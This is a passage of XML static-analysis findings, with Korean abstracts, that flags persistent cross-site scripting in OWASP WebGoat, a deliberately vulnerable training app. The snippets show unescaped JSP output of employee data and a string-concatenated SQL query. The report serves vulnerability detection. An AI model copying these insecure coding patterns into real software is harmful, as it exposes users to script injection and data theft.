<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/Login.java</FilePath>
<LineStart>194</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="39F01ACA47CB883A4F9157CE7179AE85" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 38 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>38</LineStart>
<Snippet>						City/State: 
					&lt;TD&gt;
						&lt;%=employee.getAddress2()%&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="8E1D0C6B1C85EB4355AB0252ED475FFE" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 45 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>45</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getPhoneNumber()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="F0743E67EBC1EC831E9CCFB0437FD374" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 94 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>94</LineStart>
<Snippet>							EmployeeStub stub = (EmployeeStub) i.next();
								%&gt;
								&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName()%&gt;&lt;/option&gt;
						&lt;%}%&gt;
						&lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="817C085918DF353C388139CCC2BAEBF2" ruleID="94B3FB0E-4AED-4006-9CDD-B2B1C13747EE">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>DatabaseUtilities.java의 writeTable() 메서드가 154 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>DatabaseUtilities.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/DatabaseUtilities.java</FilePath>
<LineStart>154</LineStart>
<Snippet>		for (int i = 1; i &lt; (numColumns + 1); i++)
		{
		    row.addElement(new TD(results.getString(i).replaceAll(" ",
			    "&amp;nbsp;")));
		}</Snippet>
<TargetFunction>org.apache.ecs.html.TD.TD()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ProductsAdminScreen.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/admin/ProductsAdminScreen.java</FilePath>
<LineStart>75</LineStart>
<Snippet>		    ResultSet.TYPE_SCROLL_INSENSITIVE,
		    ResultSet.CONCUR_READ_ONLY);
	    ResultSet results = statement.executeQuery(QUERY);

	    if (results != null)</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="643FDDF17E6BE10AC9DAAD9E96F2135A" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 95 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>95</LineStart>
<Snippet>				&lt;TR&gt;
					&lt;TD colspan="4"&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getDisciplinaryActionNotes()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="531CE4D77B783ED03BAD965802F3D126" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 11 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>11</LineStart>
<Snippet>//	int myUserId = getIntSessionAttribute(webSession, "CrossSiteScripting." + CrossSiteScripting.USER_ID);
%&gt;
		&lt;div class="lesson_title_box"&gt;&lt;strong&gt;Welcome Back &lt;/strong&gt;&lt;span class="lesson_text_db"&gt;&lt;%=webSession.getUserNameInLesson()%&gt;&lt;/span&gt;&lt;/div&gt;
		&lt;div class="lesson_text"&gt;
				&lt;Table&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>DefaultLessonAction.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DefaultLessonAction.java</FilePath>
<LineStart>203</LineStart>
<Snippet>			{
				Statement answer_statement = WebSession.getConnection(s).createStatement( ResultSet.TYPE_SCROLL_INSENSITIVE, ResultSet.CONCUR_READ_ONLY );
				ResultSet answer_results = answer_statement.executeQuery( query );
				if (answer_results.next())
					name = answer_results.getString("first_name");</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="7F5D4D73FCD6906065161AFA03C02343" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 38 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>38</LineStart>
<Snippet>						City/State: 
					&lt;TD&gt;
						&lt;%=employee.getAddress2()%&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="8B2462006517C84F4EE64003CA2C50D7" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 51 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>51</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getStartDate()%&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="ECBFAFF5A4346D6BDF75FA44EFA19305" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 46 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>46</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.START_DATE%&gt;" type="text" value="&lt;%=employee.getStartDate()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="01FC16F98BFC5A6F08CEB999DAC9A01B" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 21 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>21</LineStart>
<Snippet>						Last Name:					&lt;/TD&gt;
					&lt;TD width="196"&gt;
					 	&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.LAST_NAME%&gt;" type="text" value="&lt;%=employee.getLastName()%&gt;"/&gt;
				  &lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ListStaff.java</FilePath>
<LineStart>98</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="79A41CB297E7F1A7224273F0E45A2E3A" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 41 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>41</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.PHONE_NUMBER%&gt;" type="text" value="&lt;%=employee.getPhoneNumber()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="09F3110C24D32C68B41A00AE1A225907" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 29 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>29</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getAddress1()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="7F5910D8AF054AAE63BCB1A22ECFA207" ruleID="94B3FB0E-4AED-4006-9CDD-B2B1C13747EE">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>CSRF.java의 makeList() 메서드가 193 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>CSRF.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CSRF.java</FilePath>
<LineStart>193</LineStart>
<Snippet>			        "&amp;menu=" + getDefaultCategory().getRanking().toString() +
			        "' style='cursor:hand'&gt;" +  results.getString( TITLE_COL ) + "&lt;/a&gt;";
					TD td = new TD().addElement( link );
					TR tr = new TR().addElement( td );
					t.addElement( tr );</Snippet>
<TargetFunction>org.apache.ecs.html.TD.addElement()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>CSRF.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CSRF.java</FilePath>
<LineStart>181</LineStart>
<Snippet>			Statement statement = connection.createStatement( ResultSet.TYPE_SCROLL_INSENSITIVE, ResultSet.CONCUR_READ_ONLY );
			
			ResultSet results = statement.executeQuery( STANDARD_QUERY + " WHERE user_name LIKE '" + getNameroot( s.getUserName() ) + "%'" );

			if ( ( results != null ) &amp;&amp; ( results.first() == true ) )</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="0A63D93D46BAE019693FC96144F860E5" ruleID="94B3FB0E-4AED-4006-9CDD-B2B1C13747EE">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>DatabaseUtilities.java의 writeTable() 메서드가 154 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>DatabaseUtilities.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/DatabaseUtilities.java</FilePath>
<LineStart>154</LineStart>
<Snippet>		for (int i = 1; i &lt; (numColumns + 1); i++)
		{
		    row.addElement(new TD(results.getString(i).replaceAll(" ",
			    "&amp;nbsp;")));
		}</Snippet>
<TargetFunction>org.apache.ecs.html.TD.TD()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>SqlStringInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SqlStringInjection.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			ResultSet.TYPE_SCROLL_INSENSITIVE,
			ResultSet.CONCUR_READ_ONLY);
		ResultSet results = statement.executeQuery(query);

		if ((results != null) &amp;&amp; (results.first() == true))</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="5F22D575A334616E97EF92C6A4F0C123" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 16 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>16</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getFirstName()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="DA94F3508A997E1B236215811E48FDA8" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 41 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>41</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getPhoneNumber()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="32CBC603CAE84BA21A7508ADF668A0F5" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 94 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>94</LineStart>
<Snippet>				&lt;TR&gt;
					&lt;TD colspan="4"&gt;
						&lt;textarea name="&lt;%=RoleBasedAccessControl.DISCIPLINARY_NOTES%&gt;" cols="53" rows="2" wrap="off" class="lesson_text_db" &gt;&lt;%=employee.getDisciplinaryActionNotes()%&gt;&lt;/textarea&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="82D36E503B8C39DD3CAD2DE9BDD2FB2C" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 67 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>67</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.CCN%&gt;" type="text" value="&lt;%=employee.getCcn()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="919379B7FBC14604943DD39C1617185F" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 54 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>54</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.SSN%&gt;" type="text" value="&lt;%=employee.getSsn()%&gt;"/&gt; 
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="E024BFC891F8C4DB130B0650C587294C" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 47 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>47</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getStartDate()%&gt;
					&lt;/TD&gt;
